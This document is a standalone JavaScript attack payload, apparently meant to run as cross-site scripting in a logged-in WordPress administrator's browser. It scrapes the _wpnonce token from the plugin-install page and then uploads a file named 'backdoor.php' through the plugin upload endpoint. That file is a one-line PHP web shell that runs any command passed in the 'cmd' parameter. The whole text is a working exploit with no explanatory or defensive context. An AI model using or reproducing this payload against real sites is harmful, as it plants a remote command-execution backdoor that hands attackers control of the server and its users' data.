var ajax = new XMLHttpRequest();
ajax.open("GET","/wordpress/wp-admin/plugin-install.php",true);
ajax.onreadystatechange = function(){
  if(this.readyState == 4){
    if(this.status == 200){
      var re = /id="_wpnonce" name="_wpnonce" value="(\w+)"/;
      var result = this.responseText.match(re);
      var nonce = result[1];

      var xhr = new XMLHttpRequest();
      xhr.open("POST", "/wordpress/wp-admin/update.php?action=upload-plugin", true);
      xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
      xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
      xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------106557699112863554041057400679");
      xhr.withCredentials = true;
      var body = "-----------------------------106557699112863554041057400679\r\n" +
      "Content-Disposition: form-data; name=\"_wpnonce\"\r\n" +
      "\r\n" +
      nonce + "\r\n" +
      "-----------------------------106557699112863554041057400679\r\n" +
      "Content-Disposition: form-data; name=\"_wp_http_referer\"\r\n" +
      "\r\n" +
      "/wp-admin/plugin-install.php\r\n" +
      "-----------------------------106557699112863554041057400679\r\n" +
      "Content-Disposition: form-data; name=\"pluginzip\"; filename=\"backdoor.php\"\r\n" +
      "Content-Type: text/php\r\n" +
      "\r\n" +
      "\x3c?php echo system($_GET[\'cmd\']); ?\x3e\r\n" +
      "-----------------------------106557699112863554041057400679\r\n" +
      "Content-Disposition: form-data; name=\"install-plugin-submit\"\r\n" +
      "\r\n" +
      "Install Now\r\n" +
      "-----------------------------106557699112863554041057400679--\r\n";
      var aBody = new Uint8Array(body.length);
      for (var i = 0; i < aBody.length; i++)
      aBody[i] = body.charCodeAt(i);
      xhr.send(new Blob([aBody]));
    }
  }
}
ajax.send();